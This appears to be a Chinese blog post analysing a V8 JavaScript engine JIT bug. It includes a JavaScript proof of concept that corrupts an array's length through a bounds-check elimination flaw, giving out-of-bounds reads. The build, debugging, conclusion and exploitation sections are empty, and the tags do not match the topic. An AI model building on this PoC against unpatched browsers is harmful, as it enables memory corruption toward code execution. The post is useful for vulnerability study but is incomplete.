---
layout:     post
title:      "V8引擎CVE-2016-5198漏洞分析"
subtitle:   ""
date:       2019-09-01 10:30:00
author:     "GToad"
header-img: "img/android-five.png"
catalog: true
tags:
    - Android
    - NDK
    - Hook
    - arm64
    - inline hook
    - native hook
    - LTS
---

> 本文为本博客V8系列第五篇。

## 漏洞基本信息

[漏洞信息页面](https://bugs.chromium.org/p/chromium/issues/detail?id=906043)
[漏洞修复代码](https://chromium.googlesource.com/v8/v8/+/4e3a17d0408627517d4a81b3bf5daf85e416e9ac/test/mjsunit/regress/regress-crbug-906043.js)

根据漏洞基本信息可准备分析环境，先切换至漏洞修复前版本。
```
git checkout 
gclient sync
```

对源码进行编译。
```

```

## PoC

```javascript
// Flags: --allow-natives-syntax
function fun(arg) {
  let x = arguments.length;
  a1 = new Array(0x10);
  a1[0] = 1.1;
  a2 = new Array(0x10);
  a2[0] = 1.1;
  a1[(x >> 16) * 21] = 1.39064994160909e-309;  // 0xffff00000000
  a1[(x >> 16) * 41] = 8.91238232205e-313;  // 0x2a00000000
}
var a1, a2;
var a3 = [1.1,2.2];
a3.length = 0x11000;
a3.fill(3.3);
var a4 = [1.1];
for (let i = 0; i < 10000; i++) fun(...a4);
// %OptimizeFunctionOnNextCall(fun);
fun(...a3);
for (i = 0; i < a2.length; i++){
    console.log(a2[i]);
}
console.log(a2.length);
```

与以往POC引起崩溃不同，本次POC执行后V8引擎并不会崩溃，而是发现数组a2的长度存在异常。根据这段JS的含义，a2应该自始至终都是一个长度为16的数组。而POC最后对a2的内容和长度进行输出时发现a2在确保原有的16个元素数值正确以外(a2[0]=1.1，a2[1-15]=undefined)，还额外输出了26个不明元素，且长度被改为了42。

该运算结果虽未引起内存崩溃但由于与JS本身语法运行规则不符，故存在漏洞。

## 漏洞成因

#### 调试分析

使用GDB对V8进行调试，

#### 本质原因

V8在typer phase里对SpeculativeNumberShiftRight的range进行计算。

由于在typer phase还不会对Load处理，于是在第一次对NumberShiftRight进行range analysis的时候，会将其范围直接当做int32的最大和最小值。

于是在第一次对NumberShiftRight进行range analysis之后得到

然后在typer lowering phase里将JSCreateArray reduce成ArgumentsLength,并计算其范围。

然后在load elimination phase里将多余的LoadField remove，直接替换成真正的值，ArgumentsLength。

于是在simplified lowering phase里，为了修正这个SpeculativeNumberShiftRight的范围，于是再次对其进行typer计算。

由于这个结果被作为数组的index，所以最终在VisitCheckBounds里，会比较这个范围和数组最大的长度，如果始终index小于数组的length，那么就会将其remove掉。



#### 结论

## 漏洞利用